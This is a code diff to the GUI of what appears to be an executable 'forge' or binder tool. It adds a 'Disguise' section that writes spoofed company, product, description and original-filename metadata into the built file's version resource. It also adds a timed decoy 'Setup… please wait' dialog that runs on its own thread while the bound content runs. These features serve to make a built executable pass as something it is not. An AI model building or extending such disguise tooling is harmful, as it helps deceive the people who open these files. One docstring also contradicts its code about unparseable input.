@@ -33,6 +33,7 @@ from PySide6.QtWidgets import QComboBox, QHBoxLayout, QLabel, QVBoxLayout, QWidg
 
 from core import rename
 from core.forge import OUTPUT_EXE, OUTPUT_MODES, OUTPUT_PY
+from core.schema import VersionConfig
 
 from ..widgets.field import Card, LabelledEdit
 
@@ -177,12 +178,74 @@ class ForgePage(QWidget):
         bound_card.add(self._fuse)
         bound_card.body.addWidget(fuse_hint)
 
+        # The properties sheet and the dialog are one idea with two surfaces: what the
+        # file looks like while it is being looked at. Both are written into the
+        # launcher's resources, both are optional, and both are empty by default.
+        self._company = LabelledEdit("Company", placeholder="leave blank to keep the launcher's")
+        self._product = LabelledEdit("Product", placeholder="leave blank to keep the launcher's")
+        self._description = LabelledEdit(
+            "Description", placeholder="shown beside the process name"
+        )
+        self._copyright = LabelledEdit("Copyright", placeholder="optional")
+        self._original_name = LabelledEdit(
+            "Original filename", placeholder="the name the file claims to have been"
+        )
+        self._file_version = LabelledEdit("File version", placeholder="1.0.0.0")
+        self._product_version = LabelledEdit(
+            "Product version", placeholder="blank copies the file version"
+        )
+
+        version_hint = QLabel(
+            "Written into RT_VERSION, which is the block the properties sheet reads. "
+            "Versions are four numbers, each 0 to 65535. A field left blank is left out "
+            "of the block rather than written empty."
+        )
+        version_hint.setObjectName("hint")
+        version_hint.setWordWrap(True)
+
+        disguise_card = Card(
+            "Disguise",
+            "What the file says about itself when someone looks. Empty means the "
+            "launcher's own values are left alone.",
+        )
+        for field in (
+            self._company,
+            self._product,
+            self._description,
+            self._copyright,
+            self._original_name,
+            self._file_version,
+            self._product_version,
+        ):
+            disguise_card.add(field)
+            field.changed.connect(self._refresh_preview)
+        disguise_card.body.addWidget(version_hint)
+
+        self._decoy_seconds = LabelledEdit(
+            "Dialog seconds", placeholder="0 for no dialog"
+        )
+        self._decoy_title = LabelledEdit("Dialog title", placeholder="Setup")
+        self._decoy_text = LabelledEdit("Dialog text", placeholder="Preparing, please wait…")
+        for field in (self._decoy_seconds, self._decoy_title, self._decoy_text):
+            disguise_card.add(field)
+        self._decoy_seconds.changed.connect(self._refresh_preview)
+
+        decoy_hint = QLabel(
+            "One dialog, on screen for that many seconds, closed by a timer rather than "
+            "by a click. It runs on its own thread: a dialog that nobody dismisses must "
+            "never hold up the run. Ceiling 600 seconds."
+        )
+        decoy_hint.setObjectName("hint")
+        decoy_hint.setWordWrap(True)
+        disguise_card.body.addWidget(decoy_hint)
+
         column = QVBoxLayout(self)
         column.setContentsMargins(0, 0, 0, 0)
         column.setSpacing(18)
         column.addWidget(format_card)
         column.addWidget(launcher_card)
         column.addWidget(bound_card)
+        column.addWidget(disguise_card)
         column.addStretch(1)
 
         self._on_mode(0)
@@ -205,13 +268,43 @@ class ForgePage(QWidget):
     def fuse(self) -> Path | None:
         return self._fuse.path()
 
+    def version(self) -> VersionConfig:
+        """The properties sheet, with blank fields meaning "leave it alone"."""
+        return VersionConfig(
+            company=self._company.text().strip(),
+            product=self._product.text().strip(),
+            description=self._description.text().strip(),
+            copyright=self._copyright.text().strip(),
+            original_name=self._original_name.text().strip(),
+            file_version=self._file_version.text().strip(),
+            product_version=self._product_version.text().strip(),
+        )
+
+    def decoy(self) -> tuple[int, str, str]:
+        """``(seconds, title, text)``. An unparseable number is zero, not a crash."""
+        raw = self._decoy_seconds.text().strip()
+        try:
+            seconds = int(raw) if raw else 0
+        except ValueError:
+            seconds = -1
+        return (
+            seconds,
+            self._decoy_title.text().strip(),
+            self._decoy_text.text().strip(),
+        )
+
     def values(self) -> dict[str, object]:
+        seconds, title, text = self.decoy()
         return {
             "mode": self.mode(),
             "name": self.name(),
             "stub": self.stub(),
             "icon": self.icon(),
             "fuse": self.fuse(),
+            "version": self.version(),
+            "decoy_seconds": seconds,
+            "decoy_title": title,
+            "decoy_text": text,
         }
 
     def reset(self) -> None:
@@ -221,11 +314,37 @@ class ForgePage(QWidget):
         self._stub.clear_problem()
         self._icon.clear_problem()
         self._fuse.clear_problem()
+        for field in (
+            self._company,
+            self._product,
+            self._description,
+            self._copyright,
+            self._original_name,
+            self._file_version,
+            self._product_version,
+            self._decoy_seconds,
+            self._decoy_title,
+            self._decoy_text,
+        ):
+            field.set_text("")
+            field.clear_problem()
         self._refresh_preview()
 
     # --- state ---------------------------------------------------------------
 
     def show_problems(self, problems) -> None:
+        prefixes: tuple[tuple[str, LabelledEdit], ...] = (
+            ("output.version.company", self._company),
+            ("output.version.product", self._product),
+            ("output.version.description", self._description),
+            ("output.version.copyright", self._copyright),
+            ("output.version.original_name", self._original_name),
+            ("output.version.file_version", self._file_version),
+            ("output.version.product_version", self._product_version),
+            ("output.decoy.seconds", self._decoy_seconds),
+            ("output.decoy.title", self._decoy_title),
+            ("output.decoy.text", self._decoy_text),
+        )
         for problem in problems:
             if problem.path == "output.name":
                 self._name.set_problem(problem.message)
@@ -235,6 +354,11 @@ class ForgePage(QWidget):
                 self._icon.set_problem(problem.message)
             elif problem.path == "output.fuse":
                 self._fuse.set_problem(problem.message)
+            else:
+                for path, field in prefixes:
+                    if problem.path == path:
+                        field.set_problem(problem.message)
+                        break
 
     # --- internals -----------------------------------------------------------
 
@@ -250,12 +374,19 @@ class ForgePage(QWidget):
         extension = ".exe" if mode == OUTPUT_EXE else ".py"
         typed = self.name()
         if typed is None:
+            # Same order the pipeline uses: a bound file lends its name, and only a
+            # build with nothing to take a name from invents one.
+            bound = self.fuse()
             try:
-                preview = rename.generate(extension)
+                if bound is not None:
+                    preview = rename.derive(bound.name, extension)
+                else:
+                    preview = rename.generate(extension)
             except rename.RenameError as exc:
-                self._preview.setText(f"cannot generate a name ({exc})")
+                self._preview.setText(f"cannot name the artifact ({exc})")
                 return
-            self._preview.setText(f"Will be named  {preview}")
+            source = " (from the bound file)" if bound is not None else ""
+            self._preview.setText(f"Will be named  {preview}{source}")
             return
 
         try:
